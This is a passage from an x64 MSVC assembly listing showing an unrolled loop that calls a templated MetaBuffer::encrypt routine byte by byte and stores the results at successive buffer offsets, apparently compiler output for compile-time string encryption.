  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
